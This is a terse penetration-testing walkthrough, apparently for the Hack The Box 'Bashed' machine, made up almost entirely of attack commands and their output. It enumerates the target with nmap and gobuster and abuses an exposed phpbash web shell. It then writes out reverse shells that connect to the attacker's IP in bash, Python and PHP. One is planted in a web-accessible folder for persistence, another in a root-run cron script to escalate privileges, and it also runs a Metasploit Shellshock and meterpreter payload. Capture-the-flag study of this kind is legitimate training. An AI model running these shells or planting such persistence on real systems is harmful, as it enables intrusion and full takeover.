# bashed, flow

## Summary

+ example

## prev enum

```sh
sudo nmap -sS -sC -sV -oA ./nmap/full_sS -O -p- 10.129.182.90
  # rename-tab
  # PORT   STATE SERVICE VERSION
  # 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  # |_http-server-header: Apache/2.4.18 (Ubuntu)
  # |_http-title: Arrexel's Development Sit
sudo vim /etc/hosts
bashed/single.html
  # https://github.com/Arrexel/phpbash
# curl -X POST -H "Content-Type: application/json" -d '{"cmd":"echo 1"}' http://bashed/uploads/phpbash.php
# curl -X POST -H "Content-Type: application/json" -d '{"cmd":"echo 1"}' http://bashed/php/phpbash.php
curl -X POST -H "Content-type: application/x-www-form-urlencoded" -d '{"cmd=whoami"}' http://bashed/dev/phpbash.php
curl -X POST http://bashed/dev/phpbash.php?cmd=whoami
```

## searchsploit

```sh
search keywords
searchsploit keywords
```

```sh
cdee
cp /usr/share/exploitdb/exploits/example ~/assets/example/temp.php
cda
```

## gobuster

```sh
dict="/usr/share/wordlists/dirb/common.txt"
ls -lah $dict                                    # 36KB
gobuster dir -u http://bashed/ -w $dict -t 20 -e -x php
  # 5min
  # http://bashed/config.php           (Status: 200) [Size: 0]  
  # http://bashed/dev                  (Status: 301) [Size: 298] [--> http://bashed/dev/]
  # http://bashed/index.html           (Status: 200) [Size: 7743]                           
  # http://bashed/js                   (Status: 301) [Size: 297] [--> http://bashed/js/]    
  # http://bashed/php                  (Status: 301) [Size: 298] [--> http://bashed/php/]    
  # http://bashed/uploads              (Status: 301) [Size: 302] [--> http://bashed/uploads/]

gobuster dir -u http://bashed/php/ -w /usr/share/wordlists/dirb/common.txt -t 20 -e -x cgi,sh,pl,py,rb,php
  # 5min
  # find /user.sh (status 200)

# sudo bash -i >& /dev/tcp/10.10.16.10/80 0>&1 # bad char
export RHOST="10.10.16.10";export RPORT=80;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

## interactive shell

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
  # C-z to background the shell
stty raw -echo; fg
```

## post enum

```sh
ps aux
sudo -l
  # User www-data may run the following commands on bashed:
  #  (scriptmanager : scriptmanager) NOPASSWD: ALL
```

## privilege escalation

```sh
cd /tmp
# wget 10.10.16.10:8000/enum-LinEnum.sh
# chmod u+x linux-local-enum.sh
# ./enum-LinEnum.sh

uploads/index.html
  # -rwxrwxrwx  1 root root   14 Dec  4  2017 index.html
cat << 'EOF' > index.php
<?php
$sock=fsockopen("10.10.16.10",1337);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
EOF
  # persistent... still www-data, but active on accessing the URL.
```

```sh
sudo -u scriptmanager bash
cd /scripts
  # test.py which write test.txt as root every other minute
cat << 'EOF' > test.py
import sys,socket,os,pty;s=socket.socket();s.connect(("10.10.16.10",1338));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")
EOF
```

## msf

```msfconsole
msf> search example
  # 2  exploit/multi/http/apache_mod_cgi_bash_env_exec      2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
msf> use 2
msf> show advanced
msf> show options
msf> set RHOSTS example
msf> ...

msf> show payloads
  # 14 payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
msf> set payload 14

msf> run -j
  # meterpreter user shell
```
